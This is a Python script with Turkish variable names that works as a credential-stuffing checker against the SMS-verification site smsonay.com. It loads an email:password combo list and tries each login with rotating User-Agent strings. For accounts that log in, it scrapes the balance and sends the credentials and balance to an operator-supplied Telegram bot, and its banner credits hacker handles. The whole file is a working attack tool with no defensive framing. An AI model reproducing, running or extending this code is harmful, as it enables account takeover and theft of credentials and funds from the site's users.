import subprocess
import sys
import requests
import random
from cfonts import render
from colorama import Fore, Style, init

init(autoreset=True)

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_packages = ['requests', 'random', 'cfonts', 'colorama']
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        install(package)

class FlexCheck:
    def __init__(self, bot_token, chat_id, dosya_adı):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.dosya_adı = dosya_adı
        self.kullanıcı_agentleri = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
        ]
        self.başarısız_koşullar = [
            "Giri\\u015f Ba\\u015far\\u0131s\\u0131z!\",\"message\":\"L\\u00fctfen email ve parolay\\u0131 kontrol edip tekrar deneyin.",
            "{\"success\":false,\"",
            "L\\u00fctfen email ve parolay\\u0131 kontrol edip tekrar deneyin."
        ]
        self.başarılı_koşullar = [
            "Giri\\u015f Ba\\u015far\\u0131l\\u0131!",
            "Ba\\u015far\\u0131yla giri\\u015f yapt\\u0131n\\u0131z."
        ]

    def flex_dosya(self):
        try:
            with open(self.dosya_adı, "r", encoding="utf-8") as dosya:
                satırlar = dosya.readlines()
                kimlikler = [satır.strip().split(":") for satır in satırlar]
            return kimlikler
        except FileNotFoundError:
            print(Fore.RED + "Dosya bulunamadı!")
            return []

    def flex_giris(self, email, şifre, kullanıcı_agenti):
        try:
            giriş_url = "https://www.smsonay.com/ajax/login"
            başlıklar = {
                "User-Agent": kullanıcı_agenti,
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
            veri = {
                "email": email,
                "password": şifre
            }
            yanıt = requests.post(giriş_url, data=veri, headers=başlıklar)
            return yanıt
        except requests.RequestException as hata:
            print(Fore.RED + "İstek hatası:", hata)
            return None

    def flex_bakiye_al(self, oturum, kullanıcı_agenti):
        try:
            panel_url = "https://www.smsonay.com/panel"
            başlıklar = {
                "User-Agent": kullanıcı_agenti
            }
            yanıt = oturum.get(panel_url, headers=başlıklar)
            if yanıt.ok:
                return self.flex_bakiye(yanıt.text)
            else:
                print(Fore.RED + "Hata")
                return None
        except requests.RequestException as hata:
            print(Fore.RED + "İstek hatası:", hata)
            return None

    def flex_bakiye(self, html):
        try:
            başlangıç_etiketi = '<a href="https://www.smsonay.com/panel/balance" class="btn btn-success me-2">'
            bitiş_etiketi = '</a>'
            başlangıç_indeksi = html.find(başlangıç_etiketi)
            if başlangıç_indeksi == -1:
                return None
            başlangıç_indeksi += len(başlangıç_etiketi)
            bitiş_indeksi = html.find(bitiş_etiketi, başlangıç_indeksi)
            if bitiş_indeksi == -1:
                return None
            bakiye_str = html[başlangıç_indeksi:bitiş_indeksi].strip()
            return bakiye_str
        except Exception as hata:
            print(Fore.RED + "Bakiye hatası:", hata)
            return None

    def flex(self):
        kimlikler = self.flex_dosya()
        if not kimlikler:
            print(Fore.RED + "Geçersiz dosya ❌")
            return

        for email, şifre in kimlikler:
            kullanıcı_agenti = random.choice(self.kullanıcı_agentleri)
            yanıt = self.flex_giris(email, şifre, kullanıcı_agenti)
            if yanıt is None:
                continue
            if any(koşul in yanıt.text for koşul in self.başarısız_koşullar):
                print(Fore.RED + f"Başarısız Giriş ❌ {email}:{şifre}")
                print(Fore.RESET + "—" * 60)
            elif any(koşul in yanıt.text for koşul in self.başarılı_koşullar):
                print(Fore.GREEN + f"Giriş başarılı ✅  {email},  {şifre}")
                print(Fore.RESET + "—" * 60)
                oturum = requests.Session()
                oturum.cookies.update(yanıt.cookies)
                bakiye = self.flex_bakiye_al(oturum, kullanıcı_agenti)
                if bakiye is not None:
                    flex_hesap = (
                        f"""
𝐅𝐥𝐞𝐱 𝐒𝐦𝐬𝐎𝐧𝐚𝐲
      𝐄𝐦𝐚𝐢𝐥: {email}
      𝐒̧𝐢𝐟𝐫𝐞: {şifre}
      𝐁𝐚𝐤𝐢𝐲𝐞: {bakiye}
𝐅𝐥𝐞𝐱 𝐒𝐦𝐬𝐎𝐧𝐚𝐲
      𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫: @FlexN01
      𝐂𝐡𝐚𝐧𝐧𝐞𝐥: @ciwanhackk
                        """
                    )
                    self.flex_telegram(flex_hesap)
            else:
                print(f"{email}: ❌.")

    def flex_telegram(self, mesaj):
        try:
            api_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage?chat_id={self.chat_id}&text={mesaj}&parse_mode=Markdown"
            requests.get(api_url)
        except Exception as hata:
            print(Fore.RED + "Telegram hatası:", hata)

    @staticmethod
    def flex_logo():
        T = render('{  FLEX  |  SMS  |  ONAY  }', colors=['white', 'cyan'], align='center')
        print(f'''\n
                      {T}
    ~ Sahibi: @FlexN01 ~
''')

        print(Fore.RED + "𝐁𝐨𝐭 𝐓𝐨𝐤𝐞𝐧ı𝐧ı𝐳ı 𝐆𝐢𝐫𝐢𝐧 : ")
        bot_token = input(Fore.RESET + " > ")
        print(Fore.RESET + "—" * 40)
        print(Fore.GREEN + "𝐂𝐡𝐚𝐭 𝐈𝐃'𝐧𝐢𝐳𝐢 𝐆𝐢𝐫𝐢𝐧 : ")
        chat_id = input(Fore.RESET + " > ")
        print(Fore.RESET + "—" * 40)
        print(Fore.MAGENTA + "𝐂𝐨𝐦𝐛𝐨 𝐃𝐨𝐬𝐲𝐚 𝐘𝐨𝐥𝐮𝐧𝐮 𝐆𝐢𝐫𝐢𝐧 : ")
        dosya_adı = input(Fore.RESET + " > ")
        print(Fore.RESET + "—" * 40)

        bot = FlexCheck(bot_token, chat_id, dosya_adı)
        bot.flex()

if __name__ == "__main__":
    FlexCheck.flex_logo()
